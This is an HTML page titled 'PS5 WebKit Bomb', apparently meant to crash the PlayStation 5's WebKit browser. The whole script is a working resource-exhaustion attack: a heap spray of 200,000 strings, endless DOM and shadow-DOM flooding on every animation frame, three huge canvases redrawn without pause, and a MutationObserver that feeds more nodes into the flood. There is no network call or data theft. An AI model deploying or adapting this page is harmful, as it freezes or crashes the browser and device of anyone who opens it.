<!DOCTYPE html>
<html>
<head>
  <title>PS5 WebKit Bomb</title>
  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
      overflow: hidden;
    }
    .boom {
      animation: scaleup 0.05s infinite alternate;
      will-change: transform;
    }
    @keyframes scaleup {
      0% { transform: scale(1); }
      100% { transform: scale(5); }
    }
  </style>
</head>
<body>
  <pre id="log">[+] PS5 WebKit Crash Bomb Loaded...</pre>

  <script>
    const log = msg => document.getElementById("log").textContent += "\n" + msg;

    // 1. Heap spray con strings
    const spray = [];
    try {
      for (let i = 0; i < 200000; i++) {
        spray.push("💥".repeat(1000));
        if (i % 1000 === 0) log(`[+] Heap spray ${i}`);
      }
    } catch (e) {
      log("[!] Heap spray error: " + e);
    }

    // 2. DOM mass spam + Shadow DOM abuse
    function domFlood() {
      for (let i = 0; i < 100; i++) {
        const host = document.createElement("div");
        host.className = "boom";
        host.style.color = "#0f0";
        host.textContent = "💣".repeat(100);
        document.body.appendChild(host);

        const shadow = host.attachShadow({ mode: "open" });
        const inner = document.createElement("span");
        inner.textContent = "🧨".repeat(50);
        shadow.appendChild(inner);
      }
      requestAnimationFrame(domFlood);
    }

    // 3. Canvas stress (solo si soportado)
    for (let i = 0; i < 3; i++) {
      const canvas = document.createElement("canvas");
      canvas.width = canvas.height = 4096;
      const ctx = canvas.getContext("2d");
      document.body.appendChild(canvas);
      setInterval(() => {
        ctx.fillStyle = "#" + Math.floor(Math.random() * 0xffffff).toString(16);
        ctx.fillRect(Math.random()*4096, Math.random()*4096, 1024, 1024);
      }, 0);
    }

    // 4. Mutation Observer para trigger loops
    const obs = new MutationObserver(() => {
      if (Math.random() < 0.5) {
        const n = document.createElement("div");
        n.textContent = "🔁" + "X".repeat(5000);
        document.body.appendChild(n);
      }
    });
    obs.observe(document.body, { childList: true, subtree: true });

    // Ejecutar bomba
    setTimeout(() => {
      log("[+] Starting DOM flood...");
      domFlood();
    }, 100);
  </script>
</body>
</html>
